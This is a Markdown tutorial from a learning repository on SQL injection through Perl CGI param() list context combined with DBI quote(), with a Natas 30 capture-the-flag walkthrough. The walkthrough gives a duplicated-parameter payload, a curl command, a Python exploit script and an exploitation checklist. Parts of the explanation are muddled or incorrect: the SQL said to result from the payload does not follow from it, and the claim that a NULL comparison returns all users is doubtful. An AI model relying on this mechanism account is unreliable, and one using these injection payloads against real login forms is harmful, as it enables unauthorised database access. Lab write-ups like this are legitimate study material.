# 🌐 Web Security — Perl CGI param() & DBI quote() Bypass

> In Perl CGI, param() can return multiple values for a single parameter.
> DBI's quote() function behaves differently with an array reference.
> When the two come together, the SQL injection protection is disabled.

---

## 📋 Table of Contents

- [The Perl CGI param() Function](#the-perl-cgi-param-function)
- [The DBI quote() Function](#the-dbi-quote-function)
- [Type Confusion Vulnerability](#type-confusion-vulnerability)
- [Usage in Natas](#usage-in-natas)

---

## The Perl CGI param() Function

In the Perl CGI module, a parameter value is read with `param('name')`:

```perl
use CGI qw(:standard);
my $user = param('username');   # "admin"
```

But if the same parameter is sent more than once:

```
?username=admin&username=hacker
```

```perl
my $user = param('username');
# Scalar context → "admin" (the first value)

my @users = param('username');
# List context → ("admin", "hacker")
```

In list context, `param()` returns an **array**.

---

## The DBI quote() Function

Perl's DBI module is used for database operations. The `quote()` function escapes values against SQL injection:

```perl
my $safe = $dbh->quote($user);
# "admin" → "'admin'"  (wrapped in single quotes)

my $query = "SELECT * FROM users WHERE username=$safe";
# SELECT * FROM users WHERE username='admin'
```

It works correctly for a normal string.

---

## Type Confusion Vulnerability

If an **array reference** is given to the `quote()` function:

```perl
my @arr = ("admin", "hacker");
my $safe = $dbh->quote(\@arr);   # array reference!
# Result: "ARRAY(0x...)" or unexpected behavior
```

The real danger: when `param()` returns an array in list context and this is passed directly to `quote()`:

```perl
# BAD: param() may return an array
my $user = $dbh->quote(param('username'));

# If ?username=admin&username=foo is sent:
# param('username') → list context → ("admin", "foo")
# quote(("admin", "foo")) → takes the first element, unquoted?
# Or different behavior → SQL injection!
```

### "The Perl Jam" — The CGI.pm Vulnerability

According to the vulnerability discovered by Netanel Rubin in 2014-2015:

```perl
# If the code is written like this:
my $query = "SELECT * FROM users WHERE username=" . $dbh->quote(param('username'));

# If ?username[]=admin is sent:
# param('username') → undef (array ref behavior)
# quote(undef) → "NULL"
# SELECT * FROM users WHERE username=NULL
# → may return all users
```

---

## Usage in Natas

### Natas 30 — Perl DBI quote() Bypass

**Source code:**

```perl
#!/usr/bin/perl
use CGI qw(:standard);
use DBI;

my $dbh = DBI->connect("DBI:mysql:...") or die;

if(param('username') && param('password')) {
    my $user = $dbh->quote(param('username'));
    my $pass = $dbh->quote(param('password'));

    my $query = "SELECT * FROM users WHERE username=$user AND password=$pass";
    my $sth   = $dbh->prepare($query);
    $sth->execute();

    if($sth->rows()) {
        print "Welcome! Password: <censored>";
    }
}
```

**Normal request:**

```
username=admin&password=test
→ SELECT * FROM users WHERE username='admin' AND password='test'
```

**Exploit — quote() bypass with an array:**

```
username=admin&password=password&password=1
```

`param('password')` → list context → `("password", 1)`

`quote(("password", 1))` → behaves differently depending on the Perl DBI version:

In old versions: `quote()` handles the numeric value in the list differently → without quotes → injection!

```sql
SELECT * FROM users WHERE username='admin' AND password=password OR 1
```

**With curl:**

```bash
curl -u natas30:[password] \
     --data "username=admin&password=password&password=1" \
     "http://natas30.natas.labs.overthewire.org/"
```

**With Python:**

```python
import requests

url      = "http://natas30.natas.labs.overthewire.org/"
username = "natas30"
password = "[natas30_password]"

# Send password twice (array behavior)
data = [
    ("username", "admin"),
    ("password", "password"),   # string
    ("password", "1"),           # integer → type confusion
]

r = requests.post(url, data=data, auth=(username, password))
print(r.text)
```

---

### Perl CGI — Checklist

```
Detection:
  ☐ Is it a Perl CGI application? (.pl extension)
  ☐ Are param() and DBI quote() used together?
  ☐ Does param() go directly to quote() in the source code?

Exploit:
  ☐ Send the same parameter twice: param=str&param=int
  ☐ Send it as an array: param[]=value
  ☐ String + integer combination: password=test&password=1
  ☐ How did the result reflect into the SQL? (error message or behavior difference)
```

---

## 🔗 Resources

- [The Perl Jam — Netanel Rubin (BlackHat 2014)](https://www.blackhat.com/docs/eu-14/materials/eu-14-Rubin-The-Perl-Jam-Exploiting-A-20-Year-Old-Vulnerability.pdf)
- [Perl CGI.pm Documentation](https://metacpan.org/pod/CGI)
- [Perl DBI — quote()](https://metacpan.org/pod/DBI#quote)

---

**Previous topic:** [21_perl_rce.md](./21_perl_rce.md)
**Next topic:** [23_log_poisoning.md](./23_log_poisoning.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
